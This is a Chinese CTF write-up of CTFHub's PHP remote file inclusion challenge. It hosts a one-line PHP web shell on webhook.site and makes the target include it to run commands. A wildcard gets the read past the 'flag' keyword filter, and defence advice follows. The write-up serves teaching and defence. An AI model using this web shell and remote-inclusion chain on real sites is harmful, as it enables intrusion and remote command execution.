---
title: CTFHub 文件包含-远程包含
date: 2026-10-22
categories: CTFHub Web 远程文件包含（RFI）、Webhook 搭建、关键字绕过
tags: CTFHub Web 远程文件包含（RFI）、Webhook 搭建、关键字绕过
---

# 题目：CTFHub 文件包含-远程包含

## 题目描述
打开题目页面，源码如下：
```php
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET['file'], "flag")) {
        include $_GET['file'];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i don't have shell, how to get flag?<br>
<a href="phpinfo.php">phpinfo</a>
```
*分析：*
存在 include($_GET['file'])，存在文件包含漏洞。
使用 strpos 过滤了 flag 关键字。
页面提示 i don't have shell，说明服务器本地没有木马文件。

## 解题思路
### 漏洞原理
既然本地没有木马，且服务器允许包含外部文件（开启了 allow_url_include），我们就可以在自己的公网服务器（或 Webhook）上放一个木马文件，让目标服务器去“包含”它。

### 攻击链
使用 Webhook.site 搭建一个伪装成远程服务器的接收端。
在 Webhook 的响应内容中写入 PHP 木马代码。
构造 ?file=https://webhook.site/xxx，让目标服务器包含并执行木马。
利用系统命令读取 flag。

## 解题步骤
1. 配置 Webhook 作为远程服务器
访问 webhook.site，获取一个专属 URL（例如：https://webhook.site/92929b62-...）。
点击右上角的 Edit 按钮。
在 Content 框中，将默认内容替换为 PHP 木马代码：
```php
<?php system($_GET['cmd']); ?>
```
点击 Save 保存。

2. 利用远程包含执行命令
因为源码拦截了 flag 关键字，我们在传入 cmd 参数时，不能直接传 flag。
在浏览器地址栏输入：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=https://webhook.site/92929b62-...&cmd=ls%20/
```
(坑：ls / 中的空格需要编码为 %20)
返回结果：
```text
bin boot dev etc flag home lib lib64 media mnt opt proc root ...
```
（成功执行 ls /，并在根目录发现了 flag 文件）

3. 读取 Flag
利用通配符 f* 绕过关键字检测：
```text
http://challenge-xxx.sandbox.ctfhub.com:10800/?file=https://webhook.site/92929b62-...&cmd=cat%20/f*
```
得到 flag

## 踩坑指南
1. php://input 伪协议被禁用
原因： 服务器环境可能关闭了 allow_url_include 或对伪协议做了限制。
解决： 改用真正的远程 URL（如 Webhook）进行包含。

2. Webhook 默认返回的是 HTML 文本，不是木马
原因： 必须手动修改 Webhook 的响应内容。
解决： 进入 Webhook 的编辑页面，写入纯 PHP 代码，确保包含时能被解析。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| 远程文件包含 (RFI) | 允许包含外部 URL 上的文件并执行 |
| Webhook 利用 | 将 Webhook 伪装成恶意远程服务器 |
| `allow_url_include` | PHP 配置项，决定是否允许包含远程文件 |
| 关键字绕过 | 使用 `*` 等通配符绕过 `strpos` 等字符串检测 |

### 防御建议
1. 关闭 allow_url_include：在 php.ini 中将其设置为 Off。
2. 白名单校验：严格限制包含的文件路径，禁止包含远程 URL。
3. 过滤协议：拦截 http://、https:// 等外部协议。
